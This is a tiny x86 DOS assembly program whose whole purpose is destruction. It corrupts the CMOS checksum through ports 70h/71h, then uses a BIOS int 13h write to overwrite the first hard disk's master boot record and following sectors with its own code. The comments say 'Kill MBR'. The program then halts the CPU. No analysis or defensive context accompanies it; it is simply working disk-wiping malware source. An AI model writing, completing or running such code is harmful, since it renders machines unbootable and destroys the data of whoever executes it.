.model tiny
.code
	org 100h

start:
	mov al,2Fh					; Modify checksum
	out 70h,al                                      ;
	out 71h,al	                                ;
	                                                ;
	xor bx,bx					;
	push cs                                         ; ES:BX - bufer
	pop es                                          ;

	mov ax,0340h					; Kill MBR & maybe 
	mov dx,0080h                                    ;  boot sector
	mov cx,0001h	                                ;
	int 13h	                                        ;

	cli
	hlt
end start
